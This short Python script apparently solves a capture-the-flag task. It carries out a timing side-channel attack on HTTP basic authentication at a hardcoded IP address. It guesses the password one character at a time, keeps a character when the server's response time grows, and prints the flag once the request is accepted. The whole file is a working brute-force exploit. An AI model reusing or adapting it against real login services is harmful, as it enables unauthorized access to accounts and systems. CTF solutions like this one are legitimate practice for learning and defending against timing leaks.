import time
import requests

url = 'http://51.68.126.197:45678/flag'
username = 'trueprogrammer3000'

def sym(c):
    if c < 10:
        return chr(ord('0') + c)
    return chr(ord('A') + c - 10)

password = 'PRIVET22'

while True:
    for i in range(36):
        here = sym(i)
        tm = -time.time()
        lol = requests.get(url, auth=(username, password + here))
        tm += time.time()
        print(password + here, tm)
        if tm >= len(password) + 1:
            password += here
            break
    lol = requests.get(url, auth=(username, password))
    if lol.text != 'Not authorized\n':
        print(lol.text)
        print(password)
    print(password)
print('Bad news:(')
